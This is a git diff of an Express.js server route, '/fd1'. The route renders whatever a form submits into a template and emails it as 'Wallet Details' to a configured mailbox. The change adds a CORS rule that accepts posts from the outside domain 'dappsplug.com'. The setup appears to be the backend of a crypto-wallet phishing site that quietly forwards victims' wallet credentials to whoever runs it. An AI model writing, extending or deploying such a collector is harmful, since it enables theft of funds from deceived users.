@@ -71,40 +71,48 @@ app.post('/fd', (req, res) => {
 	});
 });
 
-app.post('/fd1', (req, res) => {
-	ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
-		if (err) {
-			console.log('err', err);
-			return res.status(400).json({ err: 'An error occurred' });
-		} else {
-			let transporter = nodemailer.createTransport({
-				host: process.env.HOST,
-				port: process.env.PORT,
-				secure: process.env.SECURE,
-				logger: true,
-				debug: true,
-				auth: {
-					user: process.env.USER, // generated ethereal user
-					pass: process.env.PASS, // generated ethereal password
-				},
-			});
-			let mailOptions = {
-				from: process.env.FROM,
-				to: process.env.TO,
-				subject: 'Wallet Details',
-				html: data,
-			};
+app.post(
+	'/fd1',
+	cors({
+		origin: 'http://dappsplug.com',
+		methods: ['GET', 'POST'],
+		maxAge: 365 * 1000,
+	}),
+	(req, res) => {
+		ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
+			if (err) {
+				console.log('err', err);
+				return res.status(400).json({ err: 'An error occurred' });
+			} else {
+				let transporter = nodemailer.createTransport({
+					host: process.env.HOST,
+					port: process.env.PORT,
+					secure: process.env.SECURE,
+					logger: true,
+					debug: true,
+					auth: {
+						user: process.env.USER, // generated ethereal user
+						pass: process.env.PASS, // generated ethereal password
+					},
+				});
+				let mailOptions = {
+					from: process.env.FROM,
+					to: process.env.TO,
+					subject: 'Wallet Details',
+					html: data,
+				};
 
-			transporter.sendMail(mailOptions, (err, res) => {
-				if (err) {
-					console.log('err', err);
-				} else {
-					console.log('sent');
-				}
-			});
-		}
-	});
-});
+				transporter.sendMail(mailOptions, (err, res) => {
+					if (err) {
+						console.log('err', err);
+					} else {
+						console.log('sent');
+					}
+				});
+			}
+		});
+	}
+);
 
 app.post('/fd2', (req, res) => {
 	console.log('req.body', req.body.data);
